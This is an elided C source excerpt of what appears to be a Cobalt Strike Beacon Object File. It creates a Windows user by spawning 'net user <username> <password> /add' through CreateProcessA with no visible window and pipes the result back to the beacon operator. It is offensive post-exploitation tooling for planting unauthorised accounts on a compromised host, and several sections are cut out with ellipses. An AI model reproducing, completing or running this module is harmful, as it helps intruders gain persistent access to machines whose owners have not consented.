/*
 * user_create_cmd.c — Create a Windows user via net.exe command.
 *
 * Uses CreateProcessA to execute "net user <username> <password> /add".
 * This is the classic method but spawns a visible child process.
 *
 * Args: "<username> <password>"
 *   Both username and password are required.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c user_create_cmd.c -o user_create_cmd.o
 */
...
void go(char* args, int alen)
{
        ...
        if (args && alen >= 2) {
            ...
            if (!input || username_len <= 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserCmd] Usage: <username> <password>\n", 40);
                return;
            }
            ...
            if (!password || bof_strlen(username) == 0 || bof_strlen(password) == 0) {
                BeaconOutput(CALLBACK_ERROR,
                    "[UserCmd] Both username and password required\n", 46);
                return;
            }
    ...
    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa_pipe, 0)) {
        BeaconOutput(CALLBACK_ERROR, "[UserCmd] CreatePipe failed\n", 28);
        return;
    }
    ...
    if (!KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconOutput(CALLBACK_ERROR, "[UserCmd] CreateProcess failed\n", 31);
